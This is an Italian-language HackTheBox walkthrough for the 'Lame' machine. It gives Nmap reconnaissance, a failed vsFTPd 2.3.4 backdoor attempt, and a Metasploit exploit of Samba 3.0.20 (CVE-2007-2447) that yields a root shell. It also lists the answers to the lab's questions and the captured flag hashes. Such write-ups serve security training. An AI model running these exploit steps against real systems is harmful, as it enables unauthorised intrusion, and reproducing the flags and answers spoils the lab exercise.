# 💻 HTB - Lame

## 📘 Descrizione
Lame è una macchina di livello *Beginner* disponibile su HackTheBox. Durante la sessione sono state esplorate vulnerabilità note nei servizi **vsFTPd 2.3.4** e **Samba 3.0.20**, portando infine all'ottenimento dell'accesso root.

---

## 🔍 Ricognizione Iniziale

### 🔧 Comando Nmap
```bash
nmap -sC -sV 10.129.151.196

📌 Flag 1

Q: How many of the Nmap top 1000 TCP ports are open on the remote host?
A: 4

📌 Flag 2
Q: What version of VSFTPd is running on Lame?
A: 2.3.4

🧨 Tentativo di Exploit - vsFTPd 2.3.4
🔧 Comando Metasploit

msfconsole
search vsftpd

📋 Modul0 trovato

exploit/unix/ftp/vsftpd_234_backdoor

⚙️ Configurazione

use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 10.129.151.196
set RPORT 21
set PAYLOAD cmd/unix/interact
run

📤 Output

[*] 10.129.151.196:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.129.151.196:21 - USER: 331 Please specify the password.
[*] Exploit completed, but no session was created.

📌 Flag 3

Q: Does the exploit work here?
A: NO
🔍 Enumerazione Samba

📌 Flag 4

Q: What version of Samba is running on Lame (senza -Debian)?
A: 3.0.20

📌 Flag 5

Q: Quale CVE del 2007 permette RCE tramite metacaratteri nella funzione SamrChangePassword e username map script abilitato?
A: CVE-2007-2447
🔗 ExploitDB #16320
✅ Exploit Riuscito - Samba 3.0.20 (CVE-2007-2447)
🔧 Comando Metasploit

msfconsole
search Samba 3.0.20
use exploit/multi/samba/usermap_script
set RHOSTS 10.129.151.196
set LHOST <tuo_ip_tun0>
run

📤 Output

[*] Command shell session 1 opened

🧾 Verifica dei privilegi

id
# uid=0(root) gid=0(root)

📌 Flag 6

Q: Exploiting CVE-2007-2447 returns a shell as which user?
A: root


## 🏁 Escalation & Flag

🔐 Root Flag

cd /root
ls
# root.txt
cat root.txt
# fcbd8eb2dccdaa0d057e621fc043a63f

👤 User Flag (Makis)

cd /home/makis
ls
# user.txt
cat user.txt
# a9aedc5d5d8c84b8af114be31bc3dc48

## ✅ Conclusioni

    🔍 Servizi vulnerabili individuati tramite Nmap.

    ❌ L’exploit vsFTPd 2.3.4 non ha avuto successo.

    ✅ L’exploit su Samba (CVE-2007-2447) ha portato all’accesso come root.

    🎯 Obiettivi completati: ottenute sia user flag che root flag.